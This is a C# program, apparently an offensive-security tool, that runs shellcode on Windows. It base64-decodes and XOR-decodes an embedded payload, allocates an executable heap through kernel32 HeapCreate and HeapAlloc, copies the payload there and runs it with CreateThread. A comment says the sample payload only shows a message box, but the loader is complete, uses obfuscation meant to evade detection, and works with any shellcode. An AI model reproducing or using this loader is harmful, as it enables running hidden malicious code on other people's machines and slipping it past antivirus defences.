using System;
using System.Runtime.InteropServices;

namespace HeapAlloc_scRunner
{
    class Program
    {
        static void Main(string[] args)
        {
            // Example: Messagebox = "Hello World from Kr0ff"
            //Shellcode byte[] buf = new byte[] {};
            string buf = "vQnApbG+vr6pkUFBQQAQABETEBcJcJMkCcoTIX8JyhNZfwnKE2F/CcozEX8JTvYLCwxwiAlwge19ID1DbWEAgIhMAECAo6wTABB/CcoTYX/KA30JQJF/ysHJQUFBCcSBNS4JQJERf8oJWX8FygFhCECRoh0Jvoh/AMp1yQlAlwxwiAlwge0AgIhMAECAeaE0sH8NQg1lSQR4kDSXGX8FygFlCECRJ38Ayk0JfwXKAV0IQJF/AMpFyQlAkQAZABkfGBsAGQAYABsJwq1hABO+oRkAGBt/CcpTqAi+vr4cCIaAQUFBQX8JzNS/QUFBfw3MxEtAQUEJcIgA+wTCF0a+lAlwiAD7sfTjF76UCSQtLS5hFi4zLSVBDCQyMiAmJAMuOUE=";
            byte[] b64decodedbuf = Convert.FromBase64String(buf);
            Console.WriteLine(b64decodedbuf.Length);

            UIntPtr scSize = (UIntPtr)b64decodedbuf.Length;

            // Heap space creation
            UIntPtr initSize = UIntPtr.Zero;
            UIntPtr maxSize = UIntPtr.Zero;
            uint HEAP_CREATE_ENABLE_EXECUTE = (uint)HeapCreationFlags.CREATE_ENABLE_EXECUTE;

            // Heap allocation flags 
            uint HEAP_ZERO_MEMORY = (uint)HeapAllocationFlags.ZERO_MEMORY;
            
            //WaitforSingleObject = Infinite wait
            const UInt32 INFINITE = 0xFFFFFFFF;

            //Xor
            for (int i=0; i < b64decodedbuf.Length; i++) {
                b64decodedbuf[i] = (byte)((uint)b64decodedbuf[i] ^ 0x41);
            }

            // Create heap
            IntPtr hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, initSize, maxSize);
            // Allocate heap space for the shellcode
            IntPtr hAlloc = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, scSize);
            //Copy shellcode buffer to Heap
            Marshal.Copy(b64decodedbuf, 0, hAlloc, (int)scSize);
            //Create thread for shellcode
            IntPtr cThread = CreateThread(IntPtr.Zero, 0, hAlloc, IntPtr.Zero, 0, IntPtr.Zero);
            // Exec
            WaitForSingleObject(cThread, INFINITE); // Doesn't have to be infinite... 5s maybe ?
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr HeapCreate(uint flOptions, UIntPtr dwInitialSize, UIntPtr dwMaximumSize);

        [DllImport("kernel32.dll", SetLastError = false)]
        static extern IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, UIntPtr dwBytes);

        [DllImport("kernel32", CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [Flags]
        enum HeapCreationFlags : uint
        {
            CREATE_ENABLE_EXECUTE = 0x00040000,
            GENERATE_EXCEPTIONS = 0x00000004,
            NO_SERIALIZE = 0x00000001
        }
        [Flags]
        enum HeapAllocationFlags : uint
        {
            GENERATE_EXCEPTIONS = 0x00000004,
            NO_SERIALIZE = 0x00000001,
            ZERO_MEMORY = 0x00000008

        }

    }
}
